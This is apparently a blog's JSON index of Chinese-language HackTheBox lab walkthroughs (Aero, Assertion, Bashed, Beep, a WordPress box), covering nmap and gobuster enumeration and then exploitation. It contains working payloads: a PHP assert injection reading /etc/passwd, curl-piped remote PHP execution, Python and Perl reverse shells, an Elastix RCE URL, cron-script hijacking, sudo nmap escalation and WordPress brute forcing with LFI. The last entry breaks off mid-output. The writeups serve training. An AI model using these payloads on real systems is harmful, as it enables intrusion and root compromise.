[{"content":" ┌──(root㉿kali)-[~/桌面/htb]\r└─# nmap -sV -sS -A --min-rate 5000 -p- 192.168.236.143\rStarting Nmap 7.93 ( https://nmap.org ) at 2023-05-29 11:00 CST\rStats: 0:01:35 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan\rService scan Timing: About 90.00% done; ETC: 11:02 (0:00:07 remaining)\rNmap scan report for 192.168.236.143\rHost is up (0.20s latency).\rNot shown: 65525 filtered tcp ports (no-response)\rPORT STATE SERVICE VERSION\r21/tcp open ftp vsftpd 3.0.3\r22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)\r| ssh-hostkey: | 3072 234c6fffb85229653dd14e38ebfe01c1 (RSA)\r| 256 0dfd36d8056983efaea0fe4b820332ed (ECDSA)\r|_ 256 cc76171e8ec557b21f452809055aeb39 (ED25519)\r80/tcp open http Apache httpd 2.4.41 ((Ubuntu))\r|_http-server-header: Apache/2.4.41 (Ubuntu)\r|_http-title: Apache2 Ubuntu Default Page: It works\r81/tcp open http Apache httpd 2.4.41 ((Ubuntu))\r|_http-server-header: Apache/2.4.41 (Ubuntu)\r|_http-title: Test Page for the Nginx HTTP Server on Fedora\r443/tcp open http Apache httpd 2.4.41\r|_http-server-header: Apache/2.4.41 (Ubuntu)\r|_http-title: Apache2 Ubuntu Default Page: It works\r3000/tcp open ppp?\r3001/tcp open nessus?\r3003/tcp open cgms?\r3306/tcp open mysql MySQL (unauthorized)\r5432/tcp open postgresql PostgreSQL DB 9.6.0 or later\r| ssl-cert: Subject: commonName=aero\r| Subject Alternative Name: DNS:aero\r| Not valid before: 2021-05-10T22:20:48\r|_Not valid after: 2031-05-08T22:20:48\r| fingerprint-strings: | SMBProgNeg: | SFATAL\r| VFATAL\r| C0A000\r| Munsupported frontend protocol 65363.19778: server supports 2.0 to 3.0\r| Fpostmaster.c\r| L2113\r|_ RProcessStartupPacket\r|_ssl-date: TLS randomness does not represent time\r2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :\r==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============\rSF-Port3003-TCP:V=7.93%I=7%D=5/29%Time=64741593%P=x86_64-pc-linux-gnu%r(Ge\rSF:nericLines,1,\u0026#34;\\n\u0026#34;)%r(GetRequest,1,\u0026#34;\\n\u0026#34;)%r(HTTPOptions,1,\u0026#34;\\n\u0026#34;)%r(RTSPReq\rSF:uest,1,\u0026#34;\\n\u0026#34;)%r(Help,1,\u0026#34;\\n\u0026#34;)%r(SSLSessionReq,1,\u0026#34;\\n\u0026#34;)%r(TerminalServerCoo\rSF:kie,1,\u0026#34;\\n\u0026#34;)%r(Kerberos,1,\u0026#34;\\n\u0026#34;)%r(FourOhFourRequest,1,\u0026#34;\\n\u0026#34;)%r(LPDString,\rSF:1,\u0026#34;\\n\u0026#34;)%r(LDAPSearchReq,1,\u0026#34;\\n\u0026#34;)%r(SIPOptions,1,\u0026#34;\\n\u0026#34;);\r==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============\rSF-Port5432-TCP:V=7.93%I=7%D=5/29%Time=6474158F%P=x86_64-pc-linux-gnu%r(SM\rSF:BProgNeg,8C,\u0026#34;E\\0\\0\\0\\x8bSFATAL\\0VFATAL\\0C0A000\\0Munsupported\\x20fronten\rSF:d\\x20protocol\\x2065363\\.19778:\\x20server\\x20supports\\x202\\.0\\x20to\\x203\rSF:\\.0\\0Fpostmaster\\.c\\0L2113\\0RProcessStartupPacket\\0\\0\u0026#34;);\rWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\rOS fingerprint not ideal because: Missing a closed TCP port so results incomplete\rNo OS matches for host\rNetwork Distance: 4 hops\rService Info: Host: 127.0.0.2; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\rTRACEROUTE (using port 443/tcp)\rHOP RTT ADDRESS\r1 234.47 ms 192.168.45.1\r2 234.43 ms 192.168.45.254\r3 234.52 ms 192.168.251.1\r4 234.54 ms 192.168.236.143\rOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\rNmap done: 1 IP address (1 host up) scanned in 219.04 seconds ","permalink":"https://netuseradministrator.github.io/zh/posts/hackthebox/aero/","summary":"┌──(root㉿kali)-[~/桌面/htb] └─# nmap -sV -sS -A --min-rate 5000 -p- 192.168.236.143 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-29 11:00 CST Stats: 0:01:35 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan Service scan Timing: About 90.00% done; ETC: 11:02 (0:00:07 remaining) Nmap scan","title":""},{"content":"┌──(root㉿kali)-[~/桌面/vpn]\r└─# nmap -sS -sV -A --min-rate 5000 -p- 192.168.213.94\rStarting Nmap 7.93 ( https://nmap.org ) at 2023-05-17 13:33 CST\rStats: 0:00:27 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan\rService scan Timing: About 50.00% done; ETC: 13:33 (0:00:06 remaining)\rNmap scan report for 192.168.213.94\rHost is up (0.21s latency).\rNot shown: 65533 closed tcp ports (reset)\rPORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\r| ssh-hostkey: | 2048 6eceaacc02dea5a3585dda2bef5407f9 (RSA)\r| 256 9d3fdf167ae15958844ae3298f44878d (ECDSA)\r|_ 256 87b56ff82181d33b43d04081c0e36989 (ED25519)\r80/tcp open http Apache httpd 2.4.29 ((Ubuntu))\r|_http-server-header: Apache/2.4.29 (Ubuntu)\r|_http-title: Assertion\rNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\rTCP/IP fingerprint:\rOS:SCAN(V=7.93%E=4%D=5/17%OT=22%CT=1%CU=30953%PV=Y%DS=4%DC=T%G=Y%TM=6464675\rOS:0%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=108%TI=Z%II=I%TS=A)SEQ(SP=1\rOS:06%GCD=1%ISR=108%TI=Z%TS=A)OPS(O1=M551ST11NW7%O2=M551ST11NW7%O3=M551NNT1\rOS:1NW7%O4=M551ST11NW7%O5=M551ST11NW7%O6=M551ST11)WIN(W1=FE88%W2=FE88%W3=FE\rOS:88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M551NNSNW7%CC=Y%Q=\rOS:)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y\rOS:%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=N)T7(R=N)U1(R=Y%DF=N%T=40%IPL=16\rOS:4%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=ABD0%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)\rNetwork Distance: 4 hops\rService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\rTRACEROUTE (using port 143/tcp)\rHOP RTT ADDRESS\r1 212.35 ms 192.168.45.1\r2 212.39 ms 192.168.45.254\r3 212.64 ms 192.168.251.1\r4 212.77 ms 192.168.213.94\rOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\rNmap done: 1 IP address (1 host up) scanned in 50.88 seconds ┌──(root㉿kali)-[~/桌面/vpn]\r└─# gobuster dir -u http://192.168.213.94/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -r -x php,txt,log,conf\r===============================================================\rGobuster v3.5\rby OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart)\r===============================================================\r[+] Url: http://192.168.213.94/\r[+] Method: GET\r[+] Threads: 10\r[+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\r[+] Negative Status codes: 404\r[+] User Agent: gobuster/3.5\r[+] Extensions: php,txt,log,conf\r[+] Follow Redirect: true\r[+] Expanded: true\r[+] Timeout: 10s\r===============================================================\r2023/05/17 13:34:16 Starting gobuster in directory enumeration mode\r===============================================================\rhttp://192.168.213.94/.php (Status: 403) [Size: 279]\rhttp://192.168.213.94/index.php (Status: 200) [Size: 36592]\rhttp://192.168.213.94/contact.php (Status: 200) [Size: 11556]\rhttp://192.168.213.94/about.php (Status: 200) [Size: 20735]\rhttp://192.168.213.94/blog.php (Status: 200) [Size: 15274]\rhttp://192.168.213.94/img (Status: 200) [Size: 6721]\rhttp://192.168.213.94/gallery.php (Status: 200) [Size: 17070]\rhttp://192.168.213.94/pages (Status: 200) [Size: 1959]\rhttp://192.168.213.94/css (Status: 200) [Size: 2425]\rhttp://192.168.213.94/schedule.php (Status: 200) [Size: 23805]\rhttp://192.168.213.94/js (Status: 200) [Size: 2694]\rhttp://192.168.213.94/fonts (Status: 200) [Size: 2951]\rhttp://192.168.213.94/Source (Status: 200) [Size: 2543] 查了下walkthrough，有一个本地文件包含漏洞的url\nhttp://192.168.213.94/index.php?page=\n但是我猜测包含函数不是include(),require()等常规的文件包含函数，不能直接给参数page传参../../../../etc/passwd，看了下walkthrough\nPHP assertions\rGoing from the machine name and the php file extensions, we can guess that the machine is about php assertions. By using Google to search for ways to bypass php assertions, we find similar challenges and we get some suggestions to try. After a couple of tries, we find that the following payload works wonders:\rpage=\u0026#39; and die(system(\u0026#39;cat /etc/passwd\u0026#39;)) or \u0026#39;\rNot forgetting to URL encode the spaces, we use curl to send it. 应该是使用了assert()函数,等下getshell后看看他源码\nGET /index.php?page=\u0026#39;+and+die(system(\u0026#39;cat+/etc/passwd\u0026#39;))+or+\u0026#39; HTTP/1.1\rHost: 192.168.213.94\rUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\rAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\rAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\rAccept-Encoding: gzip, deflate\rConnection: close\rUpgrade-Insecure-Requests: 1 GET /index.php?page=\u0026#39;+and+die(system(\u0026#39;which+python3\u0026#39;))+or+\u0026#39; HTTP/1.1\rHost: 192.168.213.94\rUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\rAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\rAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\rAccept-Encoding: gzip, deflate\rConnection: close\rUpgrade-Insecure-Requests: 1 HTTP/1.1 200 OK\rDate: Wed, 17 May 2023 07:00:51 GMT\rServer: Apache/2.4.29 (Ubuntu)\rContent-Length: 33\rConnection: close\rContent-Type: text/html; charset=UTF-8\r/usr/bin/python3\r/usr/bin/python3 远程读取并执行php代码反弹shell\ncurl+http://192.168.45.157:5555/reverse-shell.php|php python3 -c \u0026#39;import pty; pty.spawn (\u0026#34;/bin/bash\u0026#34;)\u0026#39; \u0026lt;?php\rif (isset($_GET[\u0026#39;page\u0026#39;])) {\r$page = $_GET[\u0026#39;page\u0026#39;];\r$file = \u0026#34;pages/\u0026#34; . $page . \u0026#34;.php\u0026#34;;\r// Saving ourselves from any kind of hackings and all\rassert(\u0026#34;strpos(\u0026#39;$file\u0026#39;, \u0026#39;..\u0026#39;) === false\u0026#34;) or die(\u0026#34;Not so easy brother!\u0026#34;);\r$val = \u0026#34;pages/\u0026#34;. $page;\rif(!file_exists($file)){\rdie (\u0026#34;File does not exist\u0026#34;);\r}\r} else {\r$file = \u0026#34;index.php\u0026#34;;\r}\r?\u0026gt; assert(\u0026#34;strpos(\u0026#39;\u0026#39; and die(system(\u0026#39;cat /etc/passwd\u0026#39;)) or \u0026#39;\u0026#39;,\u0026#39;..\u0026#39;)===false\u0026#34;) or die(\u0026#34;Not so easy brother!\u0026#34;); 这里我比较好奇为什么要在system()函数前面嵌套die()函数，可能的原因是，在黑盒环境中，为了防止后面的代码影响system()函数的输出，进而通过die()终止代码的执行，确保system()的结果正常输出。\nwww-data@assertion:/$ find / -perm -4000 2\u0026gt;/dev/null\rfind / -perm -4000 2\u0026gt;/dev/null\r/usr/lib/openssh/ssh-keysign\r/usr/lib/eject/dmcrypt-get-device\r/usr/lib/policykit-1/polkit-agent-helper-1\r/usr/lib/dbus-1.0/dbus-daemon-launch-helper\r/usr/lib/snapd/snap-confine\r/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic\r/usr/bin/at\r/usr/bin/aria2c\r/usr/bin/newgrp\r/usr/bin/newgidmap\r/usr/bin/newuidmap\r/usr/bin/passwd\r/usr/bin/pkexec\r/usr/bin/sudo\r/usr/bin/chsh\r/usr/bin/traceroute6.iputils\r/usr/bin/gpasswd\r/usr/bin/chfn\r/bin/ping\r/bin/mount\r/bin/fusermount\r/bin/su\r/bin/umount\r...\rwww-data@assertion:/$ /usr/bin/aria2c -d /root/.ssh/ -o authorized_keys \u0026#34;http://192.168.45.157:5555/id_rsa.pub\u0026#34; --allow-overwrite=true ssh连接即可获取root权限\n","permalink":"https://netuseradministrator.github.io/zh/posts/hackthebox/assertion1/","summary":"┌──(root㉿kali)-[~/桌面/vpn] └─# nmap -sS -sV -A --min-rate 5000 -p- 192.168.213.94 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-17 13:33 CST Stats: 0:00:27 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan Service scan Timing: About 50.00% done; ETC: 13:33 (0:00:06 remaining) Nmap scan","title":""},{"content":"端口扫描 nmap -vv -sV -sT -A -T 4 10.129.208.65 PORT STATE SERVICE REASON VERSION\r80/tcp open http syn-ack Apache httpd 2.4.18 ((Ubuntu))\r|_http-server-header: Apache/2.4.18 (Ubuntu)\r| http-methods: |_ Supported Methods: POST OPTIONS GET HEAD\r|_http-title: Arrexel\u0026#39;s Development Site\r|_http-favicon: Unknown favicon MD5: 6AA5034A553DFA77C3B2C7B4C26CF870\r259/tcp filtered esro-gen no-response\r1417/tcp filtered timbuktu-srv1 no-response\r5004/tcp filtered avt-profile-1 no-response\r9111/tcp filtered DragonIDSConsole no-response 访问下80端口 目录探测 gobuster dir --url http://10.129.208.65 -w /usr/share/wordlists/dirb/small.txt ===============================================================\rGobuster v3.5\rby OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart)\r===============================================================\r[+] Url: http://10.129.208.65\r[+] Method: GET\r[+] Threads: 10\r[+] Wordlist: /usr/share/wordlists/dirb/small.txt\r[+] Negative Status codes: 404\r[+] User Agent: gobuster/3.5\r[+] Timeout: 10s\r===============================================================\r2023/05/01 14:29:51 Starting gobuster in directory enumeration mode\r===============================================================\r/css (Status: 301) [Size: 312] [--\u0026gt; http://10.129.208.65/css/]\r/dev (Status: 301) [Size: 312] [--\u0026gt; http://10.129.208.65/dev/]\r/images (Status: 301) [Size: 315] [--\u0026gt; http://10.129.208.65/images/]\r/js (Status: 301) [Size: 311] [--\u0026gt; http://10.129.208.65/js/]\r/php (Status: 301) [Size: 312] [--\u0026gt; http://10.129.208.65/php/]\r/uploads (Status: 301) [Size: 316] [--\u0026gt; http://10.129.208.65/uploads/]\rProgress: 959 / 960 (99.90%)\r===============================================================\r2023/05/01 14:30:35 Finished\r=============================================================== 访问下/dev 获得了user的flag，尝试进一步提权到root 权限提升 补充一点关于sudoers文件的知识 规则讲解\rsudoers文件的数据，每一行分为五个部分，我们用ABCDE来表示。\r一般情况下是: A B = {©} {D} E\r且C与D是可以省略的，我们用大括号扩起来方便大家注意到，但真正书写命令的时候不需要打括号。\r第一个部分A代表授权使用sudo的用户或者组\r第二部分B代表允许授权用户在哪些主机上使用这些权利\r第三部分C代表允许被授权用户提权到什么用户什么组级别的权限，如果省略就代表允许提权到任意用户级别。\r第四部分D代表当被授权用户是否需要输入自身密码来使用特权，若省略这代表需要输入密码\r第五部分E代表允许执行的命令，如果是all就代表允许执行所有命令\r第一部分A\rA表示的是哪个用户或者哪个用户组拥有执行sudo的权限，当A前面带有%的时候，代表的是用户组。\r例如\radmin all = (all) all\r这行命令表示admin用户可以登陆到任意主机，并且可以提权到任意用户，并且可以执行任意命令，但需要输入用户admin到密码。\r如果在admin前面加上%就会使得admin组的所有用户拥有这些权限，使用的时候需要输入对应用户的密码。而这一行命令典型的就是省略了第四个属性，也就是D，D代表的是密码。\r第二部分B\rB代表用户可以在哪些电脑上使用这些特权，这一个字段一般是主机名。\r例如：jack mycomputer=/usr/sbin/reboot,/usr/sbin/shutdown\r上面这行表示jack可以在mycomputer上提权到root用户，并且允许以root权限使用reboot与shutdown命令，但是需要输入jack的密码才可以。\r第三部分C\r代表的是允许提权到的目标用户与组，例如(root:root)的意思就是提权到root用户root组，也就是当前用户使用sudo命令的时候会获得与root用户root组相同的权限。\r当C参数隐藏的时候，默认提权权限就是root。如果是all的话就是指的可以提权到任意用户任意权限。\r第四部分D\r这个参数是用来定义当目标用户使用sudo的时候，是否需要输入用户密码。如果为NOPASSWD:则表示不需要，否则为需要,注意字母后面带了冒号。\r第五部分E\r表示允许执行的命令。 先把shell转发到kali机器上，直接在phpbash里运行python反弹shell的命令 python -c \u0026#34;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#39;10.10.16.9\u0026#39;,1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\u0026#39;/bin/sh\u0026#39;,\u0026#39;-i\u0026#39;]);\u0026#34; 后面的步骤需要耐心观察+运气了 cd /script ls -la 多次使用ls -la可以看到test.txt的最后修改时间，每隔一段时间就会更新。并且test.txt的文件所有者是root，可能是root用户的定时任务每隔一段时间运行test.py生成而来的。这里如果对test.txt的最后一次修改时间观察不仔细，很容易漏掉这个细节，这也是我踩的一个坑。 echo \u0026#39;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#39;10.10.16.9\u0026#39;,12345));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\u0026#39;/bin/sh\u0026#39;,\u0026#39;-i\u0026#39;]);\u0026#39; \u0026gt; test.py 再次将反弹shell的命令写test.py，同时监听12345端口，看看等下能不能收到shell。 看了下计划任务，果然定时执行test.py文件。 ","permalink":"https://netuseradministrator.github.io/zh/posts/hackthebox/bashed/","summary":"端口扫描 nmap -vv -sV -sT -A -T 4 10.129.208.65 PORT STATE SERVICE REASON VERSION 80/tcp open http syn-ack Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) | http-methods: |_ Supported Methods: POST OPTIONS GET HEAD |_http-title: Arrexel\u0026#39;s Development Site |_http-favicon: Unknown favicon MD5: 6AA5034A553DFA77C3B2C7B4C26CF870 259/tcp filtered esro-gen no-response 1417/tcp filtered timbuktu-srv1 no-response 5004/tcp filtered avt-profile-1 no-response 9111/tcp filtered DragonIDSConsole no-response 访问下80端口 目","title":""},{"content":"信息收集 nmap -vv -sV -sT -T 4 10.129.1.226 PORT STATE SERVICE REASON VERSION\r22/tcp open ssh syn-ack OpenSSH 4.3 (protocol 2.0)\r25/tcp open smtp? syn-ack\r80/tcp open http syn-ack Apache httpd 2.2.3\r110/tcp open pop3? syn-ack\r111/tcp open rpcbind syn-ack 2 (RPC #100000)\r143/tcp open imap? syn-ack\r443/tcp open ssl/https? syn-ack\r993/tcp open imaps? syn-ack\r995/tcp open pop3s? syn-ack\r3306/tcp open mysql? syn-ack\r4445/tcp open upnotifyp? syn-ack\r10000/tcp open http syn-ack MiniServ 1.570 (Webmin httpd)\rService Info: Host: 127.0.0.1 访问80端口，会被重定向到443端口，使用了低版本的TLS协议。在火狐里输入about:config,搜索tls.version,将tls最小的支持版本改为TLS V1\n后续就可以无视风险正常访问了\u0026#x1f606;\n漏洞利用 这里查询了一下elastix的漏洞\nsearchsploit elastix 有个RCE,贴上exp\nhttps://10.129.1.226/recordings/misc/callme_page.php?action=c\u0026amp;callmenum=233@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%2210.10.16.9%3a1234%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A 这里需要注意，必须按照payload的格式对一些特殊符号url编码，第一次利用的时候url decode成明文，发现并没有收到shell。\n拿到shell后利用python创建个交互式终端\npython -c \u0026#39;import pty; pty.spawn (\u0026#34;/bin/bash\u0026#34;)\u0026#39; 权限提升 sudo -l 这里卡住了，查了下可以利用nmap的\u0026mdash;interactive提权\nsudo nmap --interactive\rnmap\u0026gt; !python -c \u0026#34;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#39;10.10.16.9\u0026#39;,1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\u0026#39;/bin/bash\u0026#39;,\u0026#39;-i\u0026#39;]);\u0026#34;\r┌──(root💀Chinchin)-[/usr/…/modules/exploits/unix/http]\r└─# nc -lvnp 1234\rlistening on [any] 1234 ...\rconnect to [10.10.16.9] from (UNKNOWN) [10.129.1.226] 33372\rbash: no job control in this shell\rbash-3.2# whoami\rroot ","permalink":"https://netuseradministrator.github.io/zh/posts/hackthebox/beep/","summary":"信息收集 nmap -vv -sV -sT -T 4 10.129.1.226 PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 4.3 (protocol 2.0) 25/tcp open smtp? syn-ack 80/tcp open http syn-ack Apache httpd 2.2.3 110/tcp open pop3? syn-ack 111/tcp open rpcbind syn-ack 2 (RPC #100000) 143/tcp open imap? syn-ack 443/tcp open ssl/https? syn-ack 993/tcp open imaps? syn-ack 995/tcp open pop3s? syn-ack 3306/tcp open mysql? syn-ack 4445/tcp open upnotifyp? syn-ack","title":""},{"content":"┌──(root㉿kali)-[~]\r└─# nmap -sS -sV -A --min-rate 5000 -p- 192.168.213.50 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-18 10:40 CST\rNmap scan report for 192.168.213.50\rHost is up (0.18s latency).\rNot shown: 65532 closed tcp ports (reset)\rPORT STATE SERVICE VERSION\r21/tcp open ftp vsftpd 3.0.3\r| ftp-syst: | STAT: | FTP server status:\r| Connected to ::ffff:192.168.45.156\r| Logged in as ftp\r| TYPE: ASCII\r| No session bandwidth limit\r| Session timeout in seconds is 300\r| Control connection is plain text\r| Data connections will be plain text\r| At session startup, client count was 2\r| vsFTPd 3.0.3 - secure, fast, stable\r|_End of status\r|_ftp-anon: Anonymous FTP login allowed (FTP code 230)\r22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)\r| ssh-hostkey: | 2048 08eee3ff3120876c12e71caac4e754f2 (RSA)\r| 256 ade11c7de78676be9aa8bdb968927787 (ECDSA)\r|_ 256 0ce1eb060c5cb5cc1bd1fa5606223167 (ED25519)\r80/tcp open http Apache httpd 2.4.18 ((Ubuntu))\r|_http-title: Site doesn\u0026#39;t have a title (text/html).\r| http-robots.txt: 1 disallowed entry |_Hackers\r|_http-server-header: Apache/2.4.18 (Ubuntu)\rAggressive OS guesses: Linux 3.11 - 4.1 (91%), Linux 4.4 (91%), Linux 3.16 (89%), Linux 3.13 (89%), Linux 3.10 - 3.16 (88%), Linux 3.10 - 3.12 (87%), Linux 2.6.32 (87%), Linux 3.2 - 3.8 (87%), Linux 3.8 (87%), WatchGuard Fireware 11.8 (87%)\rNo exact OS matches for host (test conditions non-ideal).\rNetwork Distance: 4 hops\rService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\rTRACEROUTE (using port 443/tcp)\rHOP RTT ADDRESS\r1 194.93 ms 192.168.45.1\r2 194.99 ms 192.168.45.254\r3 195.65 ms 192.168.251.1\r4 195.80 ms 192.168.213.50\rOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\rNmap done: 1 IP address (1 host up) scanned in 62.28 seconds CMS使用了wordpress，枚举账户\nwpscan --url http://192.168.213.50/wordpress --enumerate u\r[+] btrisk\r| Found By: Author Posts - Display Name (Passive Detection)\r| Confirmed By:\r| Rss Generator (Passive Detection)\r| Author Id Brute Forcing - Author Pattern (Aggressive Detection)\r[+] admin\r| Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)\r| Confirmed By: Login Error Messages (Aggressive Detection) 试下爆破密码\n[+] Performing password attack on Xmlrpc Multicall against 1 user/s\r[SUCCESS] - admin / admin All Found Progress Time: 00:00:46 \u0026lt; \u0026gt; (40 / 28688) 0.13% ETA: ??:??:?? 登陆进去后发现plugin Mail Masta\n进行LFI漏洞利用读取flag,根据machine名猜测用户名为btrisk\nhttp://192.168.213.50/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/home/btrisk/local.txt 正确的利用方式是wordpress，通过appearance\u0026ndash;\u0026raquo;editor\u0026ndash;\u0026gt;add reverse-shell.php,添加后访问http://host/wordpress/wp-content/themes/twentyfourteen/reverse-shell.php\n获取shell\ndata@ubuntu:/var/www/html$ ./linpeas.sh\r./linpeas.sh\r▄▄▄▄▄▄▄▄▄▄▄▄▄▄\r▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄\r▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄\r▄▄▄▄ ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄\r▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\r▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\r▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄ ▄▄▄▄▄▄ ▄\r▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄ ▄▄▄▄ ▄▄ ▄▄▄ ▄▄▄▄▄ ▄▄▄\r▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄\r▄ ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄\r▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\r▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄\r▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄▄ ▄▄▄▄\r▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄ ▄ ▄▄\r▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄\r▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄\r▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄\r▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\r▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄\r▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\rlinpeas v3.1.5 - Safe OSCP by carlospolop\rADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner\u0026#39;s permission. Linux Privesc Checklist: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist LEGEND: RED/YELLOW: 95% a PE vector\rRED: You must take a look at it\rLightCyan: Users with console\rBlue: Users without console \u0026amp; mounted devs\rGreen: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) LightMangeta: Your username\rStarting linpeas. Caching Writable Folders...\r════════════════════════════════════╣ Basic information ╠════════════════════════════════════ OS: Linux version 4.4.0-62-generic (buildd@lcy01-30) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.4) ) #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017\rUser \u0026amp; Groups: uid=33(www-data) gid=33(www-data) groups=33(www-data)\rHostname: ubuntu\rWritable folder: /dev/shm\r[+] /bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h) [+] /bin/nc is available for network discover \u0026amp; port scanning (linpeas can discover hosts and scan ports, learn more with -h) Caching directories using 2 threads . . . . . . . . . . . . . . . . . . . . . . . . DONE ════════════════════════════════════╣ System 